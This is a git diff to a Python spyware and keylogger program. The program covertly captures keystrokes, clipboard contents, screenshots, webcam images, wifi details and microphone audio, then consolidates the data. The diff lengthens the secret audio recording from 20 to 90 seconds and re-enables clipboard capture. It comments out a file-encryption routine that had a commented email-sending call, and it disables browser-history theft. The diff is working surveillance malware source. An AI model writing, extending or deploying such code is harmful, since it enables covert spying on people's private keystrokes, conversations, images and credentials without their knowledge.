@@ -15,7 +15,7 @@ from requests import get
 from PIL import ImageGrab
 import psutil
 import sqlite3
-# import win32clipboard
+import win32clipboard
 from scipy.io.wavfile import write
 import sounddevice as sd
 from pynput import keyboard
@@ -97,16 +97,14 @@ def copy_clipboard():
 # Microphone Recording
 def microphone():
     fs = 44100  # Sample rate
-    seconds = 20  # Duration
+    seconds = 90  # Duration
     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
     sd.wait()
     write(file_path + audio_info, fs, myrecording)
 
 # Define separate folders for screenshots and webcam images
 currtime = datetime.now().strftime("%Y%m%d%H%M%S")
-# sessions_folder=os.path.join(file_path,f"/sessions/session{currtime}")
-# webcam_folder = os.path.join(file_path, f"{sessions_folder}/webcam_images")  # Folder for webcam images
-# screenshots_folder = os.path.join(file_path, f"{sessions_folder}/screenshots")  # Folder for screenshots
+
 
 sessions_folder = os.path.join(file_path, f"sessions", f"session{currtime}")
 webcam_folder = os.path.join(sessions_folder, "webcam_images")  # Folder for webcam images
@@ -121,6 +119,7 @@ if not os.path.exists(screenshots_folder):
     os.makedirs(screenshots_folder)
 if not os.path.exists(webcam_folder):
     os.makedirs(webcam_folder)
+
 
 # Screenshot Capture
 def screenshots():
@@ -222,15 +221,15 @@ def consolidate_data():
         with open(file_path + keys_info, "r") as key_logs:
             f.write(key_logs.read())
 
-# Encrypt Files
-def encrypt_files(files_to_encrypt):
-    for file in files_to_encrypt:
-        with open(file, 'rb') as f:
-            data = f.read()
-        encrypted = fernet.encrypt(data)
-        with open(file + ".encrypted", 'wb') as enc_file:
-            enc_file.write(encrypted)
-        # send_email(file + ".encrypted", file + ".encrypted", toaddr)
+# # Encrypt Files
+# def encrypt_files(files_to_encrypt):
+#     for file in files_to_encrypt:
+#         with open(file, 'rb') as f:
+#             data = f.read()
+#         encrypted = fernet.encrypt(data)
+#         with open(file + ".encrypted", 'wb') as enc_file:
+#             enc_file.write(encrypted)
+#         # send_email(file + ".encrypted", file + ".encrypted", toaddr)
 
 # Main Execution
 system_information()
@@ -238,7 +237,7 @@ network_activity()
 copy_clipboard()
 screenshots()
 webcam_capture()
-fetch_browser_history()
+# fetch_browser_history()
 wifi_info_fetch()
 microphone()
 consolidate_data()
